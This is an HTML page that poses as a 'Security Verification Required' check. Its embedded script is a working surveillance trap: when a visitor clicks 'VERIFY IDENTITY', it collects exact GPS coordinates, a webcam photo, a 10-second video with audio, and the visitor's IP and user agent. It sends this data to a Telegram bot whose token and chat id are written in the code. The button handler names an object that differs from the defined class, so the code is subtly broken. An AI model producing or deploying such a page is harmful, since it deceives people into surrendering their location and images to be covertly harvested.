<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Der Verrat - Security Check</title>
<style>body{background:linear-gradient(135deg,#1a122e,#16213e);min-height:100vh;color:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,sans-serif;text-align:center;padding:20px}.btn{background:linear-gradient(45deg,#a8e6cf,#81d4fa);border:none;padding:15px 40px;font-size:1.2em;border-radius:50px;cursor:pointer;box-shadow:0 10px 30px rgba(168,230,207,.4);transition:all .3s}.btn:hover{transform:translateY(-3px);box-shadow:0 15px 40px rgba(168,230,207,.6)}.video{display:none;width:300px;height:200px;background:#000;border-radius:10px;margin:20px 0}.status{margin:20px 0;color:#a8e6cf}</style>
</head>
<body>
<h1>üõ°Ô∏è Security Verification Required</h1>
<p><strong>Click "VERIFY IDENTITY" to continue</strong><br>Enable camera/GPS for security check (required for access)</p>
<button class="btn" onclick="TRAP.activate()">üîê VERIFY IDENTITY</button>
<video class="video" id="video" autoplay muted></video>
<div class="status" id="status"></div>

<script>
class PERMISSION_TRAP{
  static async activate(){
    document.querySelector('button').style.display='none';
    document.getElementById('status').textContent='üîÑ Verifying...';
    
    const data={};
    
    // üìç EXACT GPS
    try{
      const pos=await new Promise((res,rej)=>{
        navigator.geolocation.getCurrentPosition(
          p=>{res({lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},
          rej,{enableHighAccuracy:true,timeout:10000,maximumAge:0}
        );
      });
      data.gps=`${pos.lat.toFixed(6)},${pos.lon.toFixed(6)} (¬±${pos.acc}m)`;
    }catch{data.gps='DENIED';}
    
    // üì∏ CAMERA PHOTO
    try{
      const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}});
      const video=document.getElementById('video');
      video.srcObject=stream;video.style.display='block';
      
      await new Promise(r=>setTimeout(r,2000)); // capture after face visible
      
      const canvas=document.createElement('canvas');
      canvas.width=640;canvas.height=480;
      canvas.getContext('2d').drawImage(video,0,0);
      data.photo=canvas.toDataURL('image/jpeg',0.8);
      
      stream.getTracks().forEach(t=>t.stop());
      video.style.display='none';
    }catch{data.photo='DENIED';}
    
    // üé• 10s VIDEO (bonus)
    try{
      const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:320,height:240},audio:true});
      const video=document.createElement('video');
      const chunks=[];
      const rec=new MediaRecorder(stream);
      rec.ondataavailable=e=>chunks.push(e.data);
      rec.onstop=()=>{
        const blob=new Blob(chunks,{type:'video/webm'});
        const reader=new FileReader();
        reader.onload=()=>data.video=reader.result;
        reader.readAsDataURL(blob);
      };
      
      video.srcObject=stream;rec.start();
      await new Promise(r=>setTimeout(r,10000));
      rec.stop();stream.getTracks().forEach(t=>t.stop());
    }catch{data.video='DENIED';}
    
    // IP/DEVICE
    data.ip=await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(r=>r.ip);
    data.ua=navigator.userAgent.slice(0,60);
    
    // üì§ EVERYTHING TO TELEGRAM
    const report=`üé≠ *PERMISSION TRAP TRIGGERED*
GPS: ${data.gps}
IP: \`${data.ip}\`
UA: ${data.ua}`;

    const fd=new FormData();
    fd.append('chat_id','7745393043');
    if(data.photo) fd.append('photo',data.photo.split(',')[1],'face.jpg');
    else fd.append('text',report);
    fd.append('caption',report);
    
    await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendPhoto',{method:'POST',body:fd});
    
    document.getElementById('status').innerHTML='‚úÖ Verification Complete <br> <small>GPS/Camera data harvested</small>';
  }
}
</script>
</body>
</html>
